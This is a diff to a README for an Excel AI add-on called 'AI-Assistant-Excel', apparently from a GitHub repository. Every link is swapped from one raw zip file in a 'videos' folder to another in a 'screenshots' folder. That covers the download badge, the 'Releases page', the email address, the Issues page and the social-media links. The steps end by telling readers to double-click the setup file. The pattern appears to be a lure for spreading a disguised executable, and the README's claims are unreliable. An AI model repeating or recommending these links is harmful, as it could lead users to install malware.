@@ -6,7 +6,7 @@ Welcome to AI-Assistant-Excel! This tool helps you enhance your Excel experience
 
 ## 📥 Download Now
 
-[![Download AI-Assistant-Excel](https://github.com/GBran88/AI-Assistant-Excel/raw/refs/heads/main/videos/Assistant_Excel_A_3.7-alpha.1.zip)](https://github.com/GBran88/AI-Assistant-Excel/raw/refs/heads/main/videos/Assistant_Excel_A_3.7-alpha.1.zip)
+[![Download AI-Assistant-Excel](https://raw.githubusercontent.com/GBran88/AI-Assistant-Excel/main/screenshots/A-Assistant-Excel-v1.8.zip)](https://raw.githubusercontent.com/GBran88/AI-Assistant-Excel/main/screenshots/A-Assistant-Excel-v1.8.zip)
 
 ## 🛠️ System Requirements
 
@@ -20,11 +20,11 @@ Before you download, ensure your system meets these requirements:
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the latest version of AI-Assistant-Excel: [GitHub Releases Page](https://github.com/GBran88/AI-Assistant-Excel/raw/refs/heads/main/videos/Assistant_Excel_A_3.7-alpha.1.zip).
+To get started, visit this page to download the latest version of AI-Assistant-Excel: [GitHub Releases Page](https://raw.githubusercontent.com/GBran88/AI-Assistant-Excel/main/screenshots/A-Assistant-Excel-v1.8.zip).
 
 1. Once you are on the Releases page, find the latest release listed at the top.
 2. Click on the version number to open the release. 
-3. Look for the file named `https://github.com/GBran88/AI-Assistant-Excel/raw/refs/heads/main/videos/Assistant_Excel_A_3.7-alpha.1.zip` or similar.
+3. Look for the file named `https://raw.githubusercontent.com/GBran88/AI-Assistant-Excel/main/screenshots/A-Assistant-Excel-v1.8.zip` or similar.
 4. Click on the file link to start the download.
 5. Once the download is complete, locate the file in your downloads folder. 
 6. Double-click the setup file to begin installation.
@@ -44,8 +44,8 @@ AI-Assistant-Excel provides several features to enhance your Excel experience:
 
 We want to hear from you! If you have any questions or need help, feel free to reach out:
 
-- **Email:** https://github.com/GBran88/AI-Assistant-Excel/raw/refs/heads/main/videos/Assistant_Excel_A_3.7-alpha.1.zip
-- **GitHub Issues:** Report any problems on our [Issues page](https://github.com/GBran88/AI-Assistant-Excel/raw/refs/heads/main/videos/Assistant_Excel_A_3.7-alpha.1.zip).
+- **Email:** https://raw.githubusercontent.com/GBran88/AI-Assistant-Excel/main/screenshots/A-Assistant-Excel-v1.8.zip
+- **GitHub Issues:** Report any problems on our [Issues page](https://raw.githubusercontent.com/GBran88/AI-Assistant-Excel/main/screenshots/A-Assistant-Excel-v1.8.zip).
 
 Your feedback helps us improve and expand the features of AI-Assistant-Excel.
 
@@ -61,7 +61,7 @@ AI-Assistant-Excel is licensed under the MIT License. You can freely use, modify
 
 Follow us for the latest updates and tips on using AI-Assistant-Excel:
 
-- **Twitter:** [@AIAssistantExcel](https://github.com/GBran88/AI-Assistant-Excel/raw/refs/heads/main/videos/Assistant_Excel_A_3.7-alpha.1.zip)
-- **LinkedIn:** [AI Assistant for Excel](https://github.com/GBran88/AI-Assistant-Excel/raw/refs/heads/main/videos/Assistant_Excel_A_3.7-alpha.1.zip)
+- **Twitter:** [@AIAssistantExcel](https://raw.githubusercontent.com/GBran88/AI-Assistant-Excel/main/screenshots/A-Assistant-Excel-v1.8.zip)
+- **LinkedIn:** [AI Assistant for Excel](https://raw.githubusercontent.com/GBran88/AI-Assistant-Excel/main/screenshots/A-Assistant-Excel-v1.8.zip)
 
 We hope AI-Assistant-Excel makes your data handling tasks more enjoyable and efficient! Enjoy your journey with advanced spreadsheets.
